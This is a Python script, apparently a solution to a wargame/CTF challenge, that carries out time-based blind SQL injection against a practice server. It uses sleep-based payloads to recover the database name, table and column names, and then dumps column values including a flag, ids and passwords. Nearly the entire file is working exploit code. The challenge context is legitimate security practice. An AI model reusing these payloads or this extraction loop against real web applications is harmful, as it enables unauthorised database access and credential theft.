#-*- coding: utf-8 -*-
from itertools import izip_longest
import requests
import sys
import time

url = "http://wargame.catsecurity.net:19007" # change URL
#answer = "hello" # change ANSWER

def data_res(payload) :
    
    data ={"id" : payload,"pw":"1"}  #change DATA
    res = requests.get(url,params=data)
    return res



dalen=0
db=[]
dbname =''


'''
for num in range(1,50) :  #DB길이구하기
    payload = "1'/**/or/**/if(length(database())="+str(num)+",sleep(2),1)#"
    t1 = time.time()
    res = data_res(payload)
    t2 = time.time()
    #print res.text
    if t2-t1 > 2 :
        dblen = num+1
        print dblen
        break;


for num2 in range(1,dblen) :  # DB 이름 찾기 
    for num in range(20,127) : 
        payload = "1'/**/or/**/if(right(left(database(),"+str(num2)+"),1)=binary(\'"+chr(num)+"\'),sleep(2),1)#"
        #print payload
        #payload = "1 or if(length(database())>3,sleep(0.9),1)"
        t1 = time.time()
        res = data_res(payload)
        t2 = time.time()
        #print t2-t1
        #print res.text
        if t2-t1 > 2 : 
            
            print str(chr(num))
            dbname += str(chr(num))
            break
    
    if num == 126 : 
        break

    
db.append(dbname)            
print "DB name : " , db
'''
db= ['mysql_injection03']
#dbname= 'mysql_injection03'

table = []
'''
for dbname in db : 
    for num3 in range(0,50) : 
        table_name = ''
        tblen = 0
        for num in range(1,50) :  #table길이구하기
            payload = "1'/**/or/**/if(length((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=\'"+dbname+"\'/**/limit/**/"+str(num3)+",1))="+str(num)+",sleep(2),1)#"
            t1 = time.time()
            res = data_res(payload)
            t2 = time.time()
            #print res.text
            if t2-t1 > 2 :
                tblen = num+1
                print "length : ",tblen
                break;
                
        for num2 in range(1,tblen) :  # DB 이름 찾기 
            for num in range(20,127) : 
                payload = "1'/**/or/**/if(right(left((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=\'"+dbname+"\'/**/limit/**/"+str(num3)+",1),"+str(num2)+"),1)=binary(\'"+chr(num)+"\'),sleep(2),1)#"
                #print payload 
                
                t1 = time.time()
                res = data_res(payload)
                t2 = time.time()
                #print res.text
                if t2-t1 > 2 : 
                    print str(chr(num))
                    table_name += str(chr(num))
                    break
                
            if num == 126 : 
                    break
        
        if table_name == '':
            break
        
        table.append(table_name)
        print dbname,"'s table",num3," name : " , table_name




'''
column = []


table = ['_fffflag__123_','mem']
'''
for table_name in table : 
    for num3 in range(0,50) : 
        column_name = ''    
        colen = 0
        for num in range(1,50) :  #table길이구하기
            payload = "1'/**/or/**/if(length((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/=\'"+table_name+"\'/**/limit/**/"+str(num3)+",1))="+str(num)+",sleep(2),1)#"
            t1 = time.time()
            res = data_res(payload)
            t2 = time.time()
            #print res.text
            if t2-t1 > 2 :
                colen = num+1
                print "length : ",colen
                break;
                
        
        
        for num2 in range(1,colen) :  # DB 이름 찾기 
            for num in range(20,127) : 
                payload = "1'/**/or/**/if(right(left((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/=\'"+table_name+"\'/**/limit/**/"+str(num3)+",1),"+str(num2)+"),1)=binary(\'"+chr(num)+"\'),sleep(2),1)#"
                
                t1 = time.time()
                res = data_res(payload)
                t2 = time.time()
                
                if t2-t1 > 2 : 
                    
                    print str(chr(num))
                    column_name += str(chr(num))
                    break
                
                
            if num ==126 :
                break
                
        if column_name == '' :
            break 
        
        column.append(column_name)
        print table_name,"'s column",num3,"_name : ",column_name
'''

column=['f1l2a3g4','id','pw']

value = []
for table_name in table :    
    for column_name in column : 
        for num3 in range(0,30) : 
            column_value = ''
            vlen = 0
            for num in range(1,50) :  #table길이구하기
                payload = "1'/**/or/**/if(length((select/**/"+column_name+"/**/from/**"+table_name+"/**/limit/**/"+str(num3)+",1))="+str(num)+",sleep(2),1)#"
                t1 = time.time()
                res = data_res(payload)
                t2 = time.time()
                print payload
                if t2-t1 > 2 :
                    vlen = num+1
                    print "length : ",vlen
                    break;
            
            
            for num2 in range(1,vlen) :  # DB 이름 찾기 
                for num in range(20,127) : 
                    payload = "1'/**/or/**/if(right(left(((select/**/"+column_name+"/**/from/**"+table_name+"/**/limit/**/"+str(num3)+",1),"+str(num2)+",1))=\'"+chr(num)+"\',sleep(2),1)#"
                   
                    t1 = time.time()
                    res = data_res(payload)
                    t2 = time.time()
                    
                    if t2-t1 > 2 : 
                        
                        print str(chr(num))
                        column_value += str(chr(num))
                        break
                
                    
                if num == 126 :
                    break
                
            if column_value == '' :
                break
                    
            value.append(column_value)
            print column_name,"'s value",num3," : " ,column_value           

